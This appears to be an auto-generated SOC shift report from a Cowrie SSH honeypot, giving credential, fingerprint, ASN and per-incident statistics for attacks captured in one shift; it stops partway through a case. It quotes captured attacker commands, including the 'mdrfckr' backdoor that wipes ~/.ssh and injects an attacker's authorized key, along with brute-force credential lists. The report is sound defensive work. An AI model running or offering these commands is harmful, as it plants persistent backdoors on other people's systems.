# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-06 |
| **Generated At** | 2026-11-06T18:41:46Z |
| **Shift Time** | 18:41 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **332** |
| Confirmed Threats | **271** |
| False Positives Filtered | **61** (18.4%) |
| Unique Attacker IPs | **171** |
| Countries of Origin | **41** |
| High Severity Cases | **172** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **160** |
| Malware Samples Analyzed | **9** HIGH · **25** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **394** |
| Unique Credential Pairs | **124** |
| Unique Usernames | **34** |
| Unique Passwords | **97** |
| Successful Auth Pairs | **212** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 170 |
| `rootssssss23424123123` | 59 |
| `support` | 29 |
| `admin` | 18 |
| `345gs5662d34` | 10 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `rootssssss23424123123` | 59 |
| `root3245gs5662d34111111111` | 59 |
| `` | 33 |
| `support` | 29 |
| `admin` | 22 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 59 |
| `root` | `` | 33 |
| `support` | `support` | 29 |
| `root` | `root3245gs5662d34111111111` | 22 |
| `admin` | `admin` | 18 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support` | `10.0.0.73` | 2026-11-06T03:04:48 |
| `root` | `qq` | `10.0.0.73` | 2026-11-06T03:05:59 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-11-06T03:06:02 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-11-06T03:06:03 |
| `foundry` | `foundry` | `10.0.0.73` | 2026-11-06T03:06:07 |
| `foundry` | `3245gs5662d34` | `10.0.0.73` | 2026-11-06T03:06:10 |
| `support` | `support` | `176.53.159.196` | 2026-11-06T03:11:05 |
| `admin` | `admin` | `77.90.185.29` | 2026-11-06T03:22:38 |
| `admin` | `admin` | `10.0.0.73` | 2026-11-06T03:28:45 |
| `admin` | `admin` | `80.94.95.118` | 2026-11-06T03:31:28 |
| `root` | `testtest` | `10.0.0.73` | 2026-11-06T03:39:20 |
| `rootssssss23424123123` | `rootssssss23424123123` | `10.0.0.73` | 2026-11-06T03:39:24 |
| `root` | `root3245gs5662d34111111111` | `10.0.0.73` | 2026-11-06T03:39:26 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2223` | `8.222.160.19` | 2026-11-06T03:47:47 |
| `newuser` | `admin123` | `10.0.0.73` | 2026-11-06T03:55:30 |
| `newuser` | `root3245gs5662d34111111111` | `10.0.0.73` | 2026-11-06T03:55:36 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.210.144.24` | 2026-11-06T04:08:26 |
| `*1` | `$4` | `35.210.144.24` | 2026-11-06T04:08:35 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 3262` | `35.210.144.24` | 2026-11-06T04:08:37 |
| `root` | `1` | `2.57.122.209` | 2026-11-06T04:13:53 |
_… 192 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **332** |
| Sessions with Fingerprint | **27** |
| Unique HASSH Fingerprints | **27** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 99 |
| libssh | 74 |
| OpenSSH | 10 |
| Unknown | 4 |
| PuTTY | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 61 | 4 |
| `f555226df196...` | Mirai/variant | 55 | 29 |
| `f1e5e9d24e5e...` | Mirai/variant | 8 | 1 |
| `eff4c24daffc...` | Modern SSH client | 8 | 1 |
| `390ffe68a68c...` | Modern SSH client | 7 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 61 | 4 | Mirai/variant |
| `f555226df196...` | libssh | 55 | 29 | Mirai/variant |
| `95420f9d932d...` | libssh | 10 | 8 | — |
| `f1e5e9d24e5e...` | Go SSH scanner | 8 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 8 | 1 | Modern SSH client |
| `390ffe68a68c...` | OpenSSH | 7 | 3 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 4 | 2 | Mirai/variant |
| `a289c065bf37...` | Go SSH scanner | 4 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **71** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 49 | 27 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `190.105.160.5`, `27.72.31.67`, `52.233.193.61`, `186.209.52.216`, `165.154.208.159`, `117.50.119.17`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1h
```
Source IPs: `77.90.185.20`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **171** |
| Unique ASNs | **84** |
| High-Risk ASNs | **63** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 44 | HIGH |
| `AS213412` | ONYPHE SAS | 10 | LOW |
| `AS8075` | Microsoft Corporation | 7 | HIGH |
| `AS396982` | Google LLC | 7 | LOW |
| `AS398324` | Censys, Inc. | 7 | HIGH |
| `AS15169` | Google LLC | 5 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS6939` | Hurricane Electric LLC | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (166)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c8ee79ec2c8d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-06 03:11 |
| **Last Seen** | 2026-11-06 03:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 03:11:04` | `cowrie.session.connect` |
| `2026-11-06 03:11:04` | `cowrie.client.version` |
| `2026-11-06 03:11:04` | `cowrie.client.kex` |
| `2026-11-06 03:11:05` | `cowrie.login.success` |
| `2026-11-06 03:11:05` | `cowrie.direct-tcpip.request` |
| `2026-11-06 03:11:05` | `cowrie.direct-tcpip.data` |
| `2026-11-06 03:11:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1a691f98b40

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]29` |
| **First Seen** | 2026-11-06 03:22 |
| **Last Seen** | 2026-11-06 03:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 03:22:38` | `cowrie.session.connect` |
| `2026-11-06 03:22:38` | `cowrie.client.version` |
| `2026-11-06 03:22:38` | `cowrie.client.kex` |
| `2026-11-06 03:22:38` | `cowrie.login.success` |
| `2026-11-06 03:22:40` | `cowrie.direct-tcpip.request` |
| `2026-11-06 03:22:40` | `cowrie.direct-tcpip.ja4` |
| `2026-11-06 03:22:40` | `cowrie.direct-tcpip.data` |
| `2026-11-06 03:22:40` | `cowrie.direct-tcpip.request` |
| `2026-11-06 03:22:41` | `cowrie.direct-tcpip.ja4` |
| `2026-11-06 03:22:41` | `cowrie.direct-tcpip.data` |
| `2026-11-06 03:22:42` | `cowrie.direct-tcpip.request` |
| `2026-11-06 03:22:42` | `cowrie.direct-tcpip.ja4` |
| `2026-11-06 03:22:42` | `cowrie.direct-tcpip.data` |
| `2026-11-06 03:22:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]29` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aff8f650b750

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-11-06 03:31 |
| **Last Seen** | 2026-11-06 03:32 |
| **Session Duration** | 48s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 03:31:28` | `cowrie.session.connect` |
| `2026-11-06 03:31:28` | `cowrie.client.version` |
| `2026-11-06 03:31:28` | `cowrie.client.kex` |
| `2026-11-06 03:31:28` | `cowrie.login.success` |
| `2026-11-06 03:31:38` | `cowrie.direct-tcpip.request` |
| `2026-11-06 03:31:50` | `cowrie.direct-tcpip.ja4` |
| `2026-11-06 03:31:50` | `cowrie.direct-tcpip.data` |
| `2026-11-06 03:31:58` | `cowrie.direct-tcpip.request` |
| `2026-11-06 03:32:01` | `cowrie.direct-tcpip.ja4` |
| `2026-11-06 03:32:01` | `cowrie.direct-tcpip.data` |
| `2026-11-06 03:32:12` | `cowrie.direct-tcpip.request` |
| `2026-11-06 03:32:15` | `cowrie.direct-tcpip.ja4` |
| `2026-11-06 03:32:15` | `cowrie.direct-tcpip.data` |
| `2026-11-06 03:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86c1c974dd2e

| Field | Detail |
|---|---|
| **Source IP** | `8.222.160[.]19` |
| **First Seen** | 2026-11-06 03:47 |
| **Last Seen** | 2026-11-06 03:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: curl/7.64.1, Accept: */*` |
| **TTPs (MITRE)** | T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 03:47:47` | `cowrie.session.connect` |
| `2026-11-06 03:47:47` | `cowrie.login.success` |
| `2026-11-06 03:47:47` | `cowrie.session.params` |
| `2026-11-06 03:47:47` | `cowrie.command.input` |
| `2026-11-06 03:47:47` | `cowrie.command.failed` |
| `2026-11-06 03:47:47` | `cowrie.command.input` |
| `2026-11-06 03:47:47` | `cowrie.command.failed` |
| `2026-11-06 03:47:47` | `cowrie.command.input` |
| `2026-11-06 03:47:50` | `cowrie.log.closed` |
| `2026-11-06 03:47:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.222.160[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.222.160[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbe015b600c6

| Field | Detail |
|---|---|
| **Source IP** | `35.210.144[.]24` |
| **First Seen** | 2026-11-06 04:08 |
| **Last Seen** | 2026-11-06 04:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:08:26` | `cowrie.session.connect` |
| `2026-11-06 04:08:26` | `cowrie.login.success` |
| `2026-11-06 04:08:27` | `cowrie.session.params` |
| `2026-11-06 04:08:27` | `cowrie.command.input` |
| `2026-11-06 04:08:27` | `cowrie.command.input` |
| `2026-11-06 04:08:27` | `cowrie.command.failed` |
| `2026-11-06 04:08:27` | `cowrie.command.input` |
| `2026-11-06 04:08:27` | `cowrie.log.closed` |
| `2026-11-06 04:08:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.144[.]24` to AbuseIPDB if not already reported
- [ ] Block `35.210.144[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-766cabbcd8f8

| Field | Detail |
|---|---|
| **Source IP** | `35.210.144[.]24` |
| **First Seen** | 2026-11-06 04:08 |
| **Last Seen** | 2026-11-06 04:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:08:35` | `cowrie.session.connect` |
| `2026-11-06 04:08:35` | `cowrie.login.success` |
| `2026-11-06 04:08:36` | `cowrie.session.params` |
| `2026-11-06 04:08:36` | `cowrie.command.input` |
| `2026-11-06 04:08:36` | `cowrie.command.failed` |
| `2026-11-06 04:08:40` | `cowrie.log.closed` |
| `2026-11-06 04:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.144[.]24` to AbuseIPDB if not already reported
- [ ] Block `35.210.144[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f37a47b5dfba

| Field | Detail |
|---|---|
| **Source IP** | `35.210.144[.]24` |
| **First Seen** | 2026-11-06 04:08 |
| **Last Seen** | 2026-11-06 04:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:08:37` | `cowrie.session.connect` |
| `2026-11-06 04:08:37` | `cowrie.login.success` |
| `2026-11-06 04:08:38` | `cowrie.session.params` |
| `2026-11-06 04:08:38` | `cowrie.command.input` |
| `2026-11-06 04:08:40` | `cowrie.log.closed` |
| `2026-11-06 04:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.144[.]24` to AbuseIPDB if not already reported
- [ ] Block `35.210.144[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc37ffe6021a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-11-06 04:13 |
| **Last Seen** | 2026-11-06 04:14 |
| **Session Duration** | 67s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_58a7a73f0ce89e029da63bfbe15743f0_small_control'"'"' '"'"'check_58a7a73f0ce89e029da63bfbe15743f0'"'"'', printf '\n%s|%s\n' 'check_58a7a73f0ce89e029da63bfbe15743f0_small_control' 'check_58a7a73f0ce89e029da63bfbe15743f0', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_58a7a73f0ce89e029da63bfbe15743f0_small_math'"'"' "$((762*203+95))"', (762*203+95, printf '\n%s|%s\n' 'check_58a7a73f0ce89e029da63bfbe15743f0_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:13:50` | `cowrie.session.connect` |
| `2026-11-06 04:13:51` | `cowrie.client.version` |
| `2026-11-06 04:13:51` | `cowrie.client.kex` |
| `2026-11-06 04:13:53` | `cowrie.login.success` |
| `2026-11-06 04:13:55` | `cowrie.client.size` |
| `2026-11-06 04:13:56` | `cowrie.session.params` |
| `2026-11-06 04:13:57` | `cowrie.command.input` |
| `2026-11-06 04:13:57` | `cowrie.command.input` |
| `2026-11-06 04:13:57` | `cowrie.command.input` |
| `2026-11-06 04:13:57` | `cowrie.command.input` |
| `2026-11-06 04:13:57` | `cowrie.command.input` |
| `2026-11-06 04:13:57` | `cowrie.command.input` |
| `2026-11-06 04:13:57` | `cowrie.command.input` |
| `2026-11-06 04:13:57` | `cowrie.command.input` |
| `2026-11-06 04:13:57` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dd3692af70d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-06 04:14 |
| **Last Seen** | 2026-11-06 04:15 |
| **Session Duration** | 78s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_11dc2cc2abb04e4f6b9d0e50dce2d1f6_small_control'"'"' '"'"'check_11dc2cc2abb04e4f6b9d0e50dce2d1f6'"'"'', printf '\n%s|%s\n' 'check_11dc2cc2abb04e4f6b9d0e50dce2d1f6_small_control' 'check_11dc2cc2abb04e4f6b9d0e50dce2d1f6', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_11dc2cc2abb04e4f6b9d0e50dce2d1f6_small_math'"'"' "$((585*558+14))"', (585*558+14, printf '\n%s|%s\n' 'check_11dc2cc2abb04e4f6b9d0e50dce2d1f6_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:14:20` | `cowrie.session.connect` |
| `2026-11-06 04:14:21` | `cowrie.client.version` |
| `2026-11-06 04:14:21` | `cowrie.client.kex` |
| `2026-11-06 04:14:25` | `cowrie.login.success` |
| `2026-11-06 04:14:26` | `cowrie.client.size` |
| `2026-11-06 04:14:27` | `cowrie.session.params` |
| `2026-11-06 04:14:28` | `cowrie.command.input` |
| `2026-11-06 04:14:28` | `cowrie.command.input` |
| `2026-11-06 04:14:28` | `cowrie.command.input` |
| `2026-11-06 04:14:28` | `cowrie.command.input` |
| `2026-11-06 04:14:28` | `cowrie.command.input` |
| `2026-11-06 04:14:28` | `cowrie.command.input` |
| `2026-11-06 04:14:28` | `cowrie.command.input` |
| `2026-11-06 04:14:28` | `cowrie.command.input` |
| `2026-11-06 04:14:28` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5f5778e8b43

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-11-06 04:15 |
| **Last Seen** | 2026-11-06 04:17 |
| **Session Duration** | 63s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_2743e4cb2f3e97648331c5f2a40a36d4_small_control'"'"' '"'"'check_2743e4cb2f3e97648331c5f2a40a36d4'"'"'', printf '\n%s|%s\n' 'check_2743e4cb2f3e97648331c5f2a40a36d4_small_control' 'check_2743e4cb2f3e97648331c5f2a40a36d4', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_2743e4cb2f3e97648331c5f2a40a36d4_small_math'"'"' "$((82*103+61))"', (82*103+61, printf '\n%s|%s\n' 'check_2743e4cb2f3e97648331c5f2a40a36d4_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:15:57` | `cowrie.session.connect` |
| `2026-11-06 04:15:58` | `cowrie.client.version` |
| `2026-11-06 04:15:58` | `cowrie.client.kex` |
| `2026-11-06 04:16:00` | `cowrie.login.success` |
| `2026-11-06 04:16:02` | `cowrie.client.size` |
| `2026-11-06 04:16:03` | `cowrie.session.params` |
| `2026-11-06 04:16:03` | `cowrie.command.input` |
| `2026-11-06 04:16:03` | `cowrie.command.input` |
| `2026-11-06 04:16:04` | `cowrie.command.input` |
| `2026-11-06 04:16:04` | `cowrie.command.input` |
| `2026-11-06 04:16:04` | `cowrie.command.input` |
| `2026-11-06 04:16:04` | `cowrie.command.input` |
| `2026-11-06 04:16:04` | `cowrie.command.input` |
| `2026-11-06 04:16:04` | `cowrie.command.input` |
| `2026-11-06 04:16:04` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8399322afea

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-06 04:16 |
| **Last Seen** | 2026-11-06 04:17 |
| **Session Duration** | 64s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_97cb0275de7130e9cc8f5ef3add35f26_small_control'"'"' '"'"'check_97cb0275de7130e9cc8f5ef3add35f26'"'"'', printf '\n%s|%s\n' 'check_97cb0275de7130e9cc8f5ef3add35f26_small_control' 'check_97cb0275de7130e9cc8f5ef3add35f26', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_97cb0275de7130e9cc8f5ef3add35f26_small_math'"'"' "$((974*630+60))"', (974*630+60, printf '\n%s|%s\n' 'check_97cb0275de7130e9cc8f5ef3add35f26_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:16:20` | `cowrie.session.connect` |
| `2026-11-06 04:16:20` | `cowrie.client.version` |
| `2026-11-06 04:16:20` | `cowrie.client.kex` |
| `2026-11-06 04:16:22` | `cowrie.login.success` |
| `2026-11-06 04:16:24` | `cowrie.client.size` |
| `2026-11-06 04:16:24` | `cowrie.session.params` |
| `2026-11-06 04:16:25` | `cowrie.command.input` |
| `2026-11-06 04:16:25` | `cowrie.command.input` |
| `2026-11-06 04:16:25` | `cowrie.command.input` |
| `2026-11-06 04:16:25` | `cowrie.command.input` |
| `2026-11-06 04:16:25` | `cowrie.command.input` |
| `2026-11-06 04:16:25` | `cowrie.command.input` |
| `2026-11-06 04:16:25` | `cowrie.command.input` |
| `2026-11-06 04:16:25` | `cowrie.command.input` |
| `2026-11-06 04:16:25` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e9c450ffc89

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-11-06 04:18 |
| **Last Seen** | 2026-11-06 04:19 |
| **Session Duration** | 79s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_2fc5261bec74c4fb619599a3678f0b0a_small_control'"'"' '"'"'check_2fc5261bec74c4fb619599a3678f0b0a'"'"'', printf '\n%s|%s\n' 'check_2fc5261bec74c4fb619599a3678f0b0a_small_control' 'check_2fc5261bec74c4fb619599a3678f0b0a', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_2fc5261bec74c4fb619599a3678f0b0a_small_math'"'"' "$((266*837+8))"', (266*837+8, printf '\n%s|%s\n' 'check_2fc5261bec74c4fb619599a3678f0b0a_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 04:18:08` | `cowrie.session.connect` |
| `2026-11-06 04:18:08` | `cowrie.client.version` |
| `2026-11-06 04:18:08` | `cowrie.client.kex` |
| `2026-11-06 04:18:11` | `cowrie.login.success` |
| `2026-11-06 04:18:13` | `cowrie.client.size` |
| `2026-11-06 04:18:14` | `cowrie.session.params` |
| `2026-11-06 04:18:15` | `cowrie.command.input` |
| `2026-11-06 04:18:15` | `cowrie.command.input` |
| `2026-11-06 04:18:15` | `cowrie.command.input` |
| `2026-11-06 04:18:15` | `cowrie.command.input` |
| `2026-11-06 04:18:15` | `cowrie.command.input` |
| `2026-11-06 04:18:15` | `cowrie.command.input` |
| `2026-11-06 04:18:15` | `cowrie.command.input` |
| `2026-11-06 04:18:15` | `cowrie.command.input` |
| `2026-11-06 04:18:15` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fe6adfa85e7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-06 04:18 |
| **Last Seen** | 2026-11-06 04:19 |
| **Session Duration** | 66s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
